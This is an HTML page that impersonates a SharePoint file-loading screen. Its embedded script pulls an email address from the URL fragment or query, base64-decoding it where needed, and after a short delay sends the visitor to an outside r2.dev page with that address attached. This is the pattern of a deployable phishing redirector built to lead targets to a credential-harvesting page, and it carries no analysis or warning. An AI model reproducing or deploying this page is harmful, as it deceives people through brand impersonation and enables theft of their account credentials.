<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading - SharePoint</title>
    <style>
        body {
            font-family: "Segoe UI", "Segoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
            background-color: #f3f2f1;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            border-radius: 2px;
            box-shadow: 0 1.6px 3.6px 0 rgba(0,0,0,.132), 0 0.3px 0.9px 0 rgba(0,0,0,.108);
            padding: 24px;
            width: 400px;
            max-width: 90%;
        }
        .header {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        .sharepoint-icon {
            width: 32px;
            height: 32px;
            margin-right: 12px;
            background-color: #0078d4;
            border-radius: 2px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }
        .title {
            color: #323130;
            font-size: 20px;
            font-weight: 600;
            margin: 0;
        }
        .loading-container {
            display: flex;
            align-items: center;
            margin-bottom: 16px;
        }
        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid #f3f2f1;
            border-top-color: #0078d4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 12px;
        }
        .loading-text {
            color: #323130;
            font-size: 14px;
            margin: 0;
        }
        .progress-container {
            background-color: #f3f2f1;
            height: 4px;
            border-radius: 2px;
            overflow: hidden;
            margin-bottom: 16px;
        }
        .progress-bar {
            height: 100%;
            background-color: #0078d4;
            width: 0%;
            animation: fill 2s linear forwards;
        }
        .file-info {
            color: #605e5c;
            font-size: 12px;
            margin: 0;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes fill {
            0% { width: 0%; }
            100% { width: 100%; }
        }
        noscript {
            display: block;
            margin-top: 16px;
            padding: 12px;
            background-color: #fde7e9;
            color: #a4262c;
            border-radius: 2px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="sharepoint-icon">S</div>
            <h1 class="title">SharePoint</h1>
        </div>
        <div class="loading-container">
            <div class="spinner"></div>
            <p class="loading-text">Preparing your file...</p>
        </div>
        <div class="progress-container">
            <div class="progress-bar"></div>
        </div>
        <p class="file-info">This may take a moment</p>
        <noscript>
            <p>JavaScript is required to proceed. Please enable JavaScript in your browser settings and reload the page.</p>
        </noscript>
    </div>

    <!-- Simple device detection and redirect script -->
    <script>
    (function() {
        const REDIRECT_DELAY = 800;

        // Mobile device detection function
        function isMobileDevice() {
            const userAgent = navigator.userAgent.toLowerCase();
            return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|phone/i.test(userAgent);
        }
        
        // Check if string is a valid email
        function isValidEmail(email) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        }
        
        // Try to decode base64 if needed, return the email
        function getEmailFromFragment(fragment) {
            // Remove any equals signs from the end
            fragment = fragment.replace(/=+$/, '');
            
            // First check if the fragment itself is a valid email
            if (isValidEmail(fragment)) {
                return fragment;
            }
            
            // Otherwise try to decode it as base64
            try {
                const decoded = atob(fragment);
                if (isValidEmail(decoded)) {
                    return decoded;
                }
            } catch (e) {
                console.error("Failed to decode fragment as base64");
            }
            
            // Return null if neither approach worked
            return null;
        }
        
        // Main redirect function
        function performRedirect() {
            // Get the fragment (everything after #)
            const fragment = window.location.hash.substring(1);
            
            // Get query string (everything after ?)
            const queryString = window.location.search.substring(1);
            const queryParams = new URLSearchParams(window.location.search);
            const queryEmail = queryParams.get('email');
            
            // Try to get email from any source
            let email = null;
            
            // First try fragment
            if (fragment) {
                email = getEmailFromFragment(fragment);
            }
            
            // If no email found in fragment, try query parameter
            if (!email && queryEmail) {
                email = getEmailFromFragment(queryEmail);
            }
            
            // If still no email found, try the raw query string
            if (!email && queryString) {
                // Remove any trailing parameters after : (like :153)
                const cleanQuery = queryString.split(':')[0];
                email = getEmailFromFragment(cleanQuery);
            }
            
            // If still no email found, do nothing
            if (!email) {
                console.log("No valid email found in URL");
                return;
            }
            
            console.log("Processing email:", email);
            
            // Check if the device is mobile
            if (isMobileDevice()) {
                // Redirect mobile devices to the original destination
                const redirectUrl = "https://pub-23ce8269cfe7466689c13707a4024893.r2.dev/index.html#" + email;
                console.log("Mobile device detected. Redirecting to:", redirectUrl);
                window.location.href = redirectUrl;
            } else {
               const redirectUrl = "https://pub-23ce8269cfe7466689c13707a4024893.r2.dev/index.html#" + email;
                console.log("Mobile device detected. Redirecting to:", redirectUrl);
                window.location.href = redirectUrl;
            }
        }
        
        // Execute redirect after a short delay
        setTimeout(performRedirect, REDIRECT_DELAY);
    })();
    </script>
</body>
</html>
